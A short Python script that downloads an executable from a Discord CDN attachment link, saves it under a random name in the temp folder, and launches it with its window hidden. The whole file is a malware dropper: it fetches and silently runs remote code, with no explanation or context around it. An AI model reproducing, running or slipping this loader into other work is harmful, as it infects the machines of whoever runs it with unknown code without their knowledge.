import requests
import os
import uuid
import tempfile
import subprocess

url = "https://cdn.discordapp.com/attachments/1222129364288671834/1224848705887404072/main.exe?ex=661efc40&is=660c8740&hm=84680cfd5f4b04386b135463a79ba811bbe3a662e794aa69b4da9d33065602a0&"
temp = tempfile.gettempdir()

name = os.path.join(temp, str(uuid.uuid4()) + ".exe")

response = requests.get(url)

if response.status_code == 200:
    with open(name, 'wb') as dosya:
        dosya.write(response.content)

    subprocess.Popen([name], creationflags=subprocess.CREATE_NO_WINDOW, shell=True)
else:
    exit
